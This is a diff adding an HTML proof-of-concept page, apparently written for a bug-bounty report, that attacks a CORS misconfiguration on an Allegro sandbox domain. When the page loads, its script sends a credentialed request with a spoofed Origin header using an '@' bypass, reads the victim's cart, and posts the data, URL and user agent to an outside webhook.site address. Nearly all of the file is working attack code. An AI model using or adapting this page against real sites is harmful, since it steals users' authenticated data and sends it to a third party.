@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Allegro CORS POC</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <div id="result"></div>
+    
+    <script>
+    // Your webhook URL
+    const WEBHOOK = 'https://webhook.site/f70c1845-2b4d-47e3-b426-11f8da61c242';
+    
+    // The exploit - this works because of the @ symbol bypass
+    const ORIGIN = 'https://attacker.com@allegro.cz.allegrosandbox.pl';
+    
+    async function exploit() {
+        try {
+            // Fetch cart data with the malicious Origin
+            const response = await fetch('https://edge.allegro.cz.allegrosandbox.pl/cart', {
+                credentials: 'include',
+                headers: {
+                    'Accept': 'application/vnd.allegro.internal.v1+json',
+                    'Origin': ORIGIN
+                }
+            });
+            
+            const cartData = await response.json();
+            
+            // Send stolen data to webhook
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    cart: cartData,
+                    timestamp: new Date().toISOString(),
+                    origin: ORIGIN,
+                    url: window.location.href,
+                    userAgent: navigator.userAgent
+                })
+            });
+            
+            document.getElementById('result').innerHTML = `
+                <h2>✅ Exploit Complete!</h2>
+                <p>Cart ID: ${cartData.id}</p>
+                <p>Total Items: ${cartData.totalQuantity}</p>
+                <p>Data sent to webhook: ${WEBHOOK}</p>
+            `;
+            
+        } catch(e) {
+            document.getElementById('result').innerHTML = `
+                <h2>❌ Error</h2>
+                <p>${e.message}</p>
+                <p>But the request may still have been sent!</p>
+            `;
+        }
+    }
+    
+    // Run exploit
+    exploit();
+    </script>
+</body>
+</html>
